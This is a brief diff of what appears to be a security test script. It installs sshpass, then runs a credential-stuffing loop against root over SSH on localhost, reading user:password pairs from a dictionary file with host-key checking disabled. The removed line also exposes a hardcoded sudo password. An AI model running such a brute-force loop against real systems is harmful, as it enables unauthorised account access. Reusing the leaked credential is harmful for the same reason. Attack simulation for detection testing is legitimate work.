@@ -1,6 +1,6 @@
 ;
 #pre
-echo "010404grz" | sudo -S sh -c '((which yum && sudo yum -y install epel-release sshpass) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass))'
+echo "%password%" | sudo -S sh -c '((which yum && sudo yum -y install epel-release sshpass) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass))'
 #check
 echo "使用字典credstuffuserpass.txt暴力破解root密码："
 for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
